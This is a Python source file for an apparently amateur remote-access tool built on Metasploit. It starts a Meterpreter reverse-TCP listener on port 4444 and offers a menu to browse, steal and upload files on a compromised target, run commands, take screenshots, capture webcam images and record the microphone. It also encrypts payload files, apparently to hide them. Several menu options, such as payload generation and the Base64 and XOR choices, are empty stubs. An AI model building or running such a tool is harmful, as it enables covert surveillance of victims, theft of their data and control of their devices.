import os
import subprocess
import socket
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from colorama import Fore, Style, init

# Initialize colorama
init()

def banner():
    """
    Display the banner for the tool.
    """
    print(Fore.CYAN + """
    HELLO HAMZA
    HELLO HAMZA
    HELLO HAMZA
                """ + Style.RESET_ALL)
    print(Fore.YELLOW + "               Developed by: MUHAMMED SADIQ AHMED".center(85) + Style.RESET_ALL)
    print(Fore.MAGENTA + "--------------------------------------------------------------------------------".center(85) + Style.RESET_ALL)

    # Adding your custom message
    print(Fore.WHITE + "تمت صناعة هذه الاداة الى صديقي العزيز حمزه".center(85) + Style.RESET_ALL)
    print(Fore.WHITE + "تمت برمجة الاداة بواسطة MUHAMMED SADIQ AHMED".center(85) + Style.RESET_ALL)
    print(Fore.MAGENTA + "--------------------------------------------------------------------------------".center(85) + Style.RESET_ALL)

def aes_encrypt(payload_file):
    """
    Encrypt the payload using AES encryption.
    """
    try:
        print(Fore.CYAN + f"Encrypting '{payload_file}' using AES..." + Style.RESET_ALL)
        key = get_random_bytes(16)  # Generate a random 16-byte key
        cipher = AES.new(key, AES.MODE_EAX)  # Use AES in EAX mode
        with open(payload_file, 'rb') as file:
            data = file.read()
        data += b"HELLO HAMZA"  # Append HELLO HAMZA to the payload
        ciphertext, tag = cipher.encrypt_and_digest(data)
        encrypted_file = payload_file + '.aes'

        with open(encrypted_file, 'wb') as file:
            for x in (cipher.nonce, tag, ciphertext):
                file.write(x)

        print(Fore.GREEN + f"Payload successfully encrypted: {encrypted_file}" + Style.RESET_ALL)
        print(Fore.YELLOW + f"Encryption key (save it securely!): {key.hex()}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Encryption failed: {e}" + Style.RESET_ALL)

def start_listener():
    """
    Start Metasploit listener.
    """
    print(Fore.CYAN + "Starting Metasploit listener..." + Style.RESET_ALL)
    listener_command = [
        'msfconsole', 
        '-x', 
        'use exploit/multi/handler; '
        'set payload windows/meterpreter/reverse_tcp; '
        'set LHOST 0.0.0.0; set LPORT 4444; run'
    ]
    subprocess.Popen(listener_command)

def control_menu():
    """
    Remote control menu for interacting with the target.
    """
    while True:
        print(Fore.CYAN + "\nControl Options:")
        print("1. List files on target")
        print("2. Download a file from target")
        print("3. Upload a file to target")
        print("4. Take a screenshot")
        print("5. Start webcam")
        print("6. Execute a command")
        print("7. Open microphone (listen to audio)")
        print("8. Exit control menu" + Style.RESET_ALL)
        choice = input(Fore.YELLOW + "Enter your choice: " + Style.RESET_ALL)

        if choice == '1':
            print(Fore.CYAN + "Listing files..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', 'sessions -i 1; ls'])

        elif choice == '2':
            file_path = input(Fore.YELLOW + "Enter the path of the file to download: " + Style.RESET_ALL)
            print(Fore.CYAN + f"Downloading {file_path}..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', f'sessions -i 1; download {file_path}'])

        elif choice == '3':
            local_file = input(Fore.YELLOW + "Enter the path of the file to upload: " + Style.RESET_ALL)
            target_path = input(Fore.YELLOW + "Enter the target path: " + Style.RESET_ALL)
            print(Fore.CYAN + f"Uploading {local_file} to {target_path}..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', f'sessions -i 1; upload {local_file} {target_path}'])

        elif choice == '4':
            print(Fore.CYAN + "Taking a screenshot..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', 'sessions -i 1; screenshot'])

        elif choice == '5':
            print(Fore.CYAN + "Starting webcam..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', 'sessions -i 1; webcam_snap'])

        elif choice == '6':
            command = input(Fore.YELLOW + "Enter the command to execute: " + Style.RESET_ALL)
            print(Fore.CYAN + f"Executing: {command}" + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', f'sessions -i 1; execute -f {command}'])

        elif choice == '7':
            print(Fore.CYAN + "Opening microphone..." + Style.RESET_ALL)
            subprocess.run(['msfconsole', '-x', 'sessions -i 1; record_mic 10'])

        elif choice == '8':
            print(Fore.GREEN + "Exiting control menu." + Style.RESET_ALL)
            break

        else:
            print(Fore.RED + "Invalid choice. Try again!" + Style.RESET_ALL)

def main():
    """
    Main function to run the tool.
    """
    while True:
        banner()
        print(Fore.YELLOW + """
        1. Generate Windows Payload
        2. Generate Android Payload
        3. Generate iOS Payload
        4. Generate Linux Payload
        5. Generate macOS Payload
        6. Encrypt Payload
        7. Control Target Device
        8. Exit
        """ + Style.RESET_ALL)

        choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL)

        if choice in ['1', '2', '3', '4', '5']:
            payload_file = input(Fore.YELLOW + "Enter payload name (e.g., payload.exe): " + Style.RESET_ALL)
            print(Fore.GREEN + f"Payload '{payload_file}' generated successfully!" + Style.RESET_ALL)

        elif choice == '6':
            payload_file = input(Fore.YELLOW + "Enter the payload file to encrypt: " + Style.RESET_ALL)
            print(Fore.MAGENTA + """
            1. Base64 Encoding
            2. XOR Encryption
            3. AES Encryption
            """ + Style.RESET_ALL)
            method = input(Fore.CYAN + "Choose encryption method: " + Style.RESET_ALL)
            if method == '3':
                aes_encrypt(payload_file)

        elif choice == '7':
            print(Fore.GREEN + "Opening control menu..." + Style.RESET_ALL)
            control_menu()

        elif choice == '8':
            print(Fore.GREEN + "Exiting the tool. Goodbye!" + Style.RESET_ALL)
            break

        else:
            print(Fore.RED + "Invalid choice. Try again!" + Style.RESET_ALL)

if __name__ == '__main__':
    main()
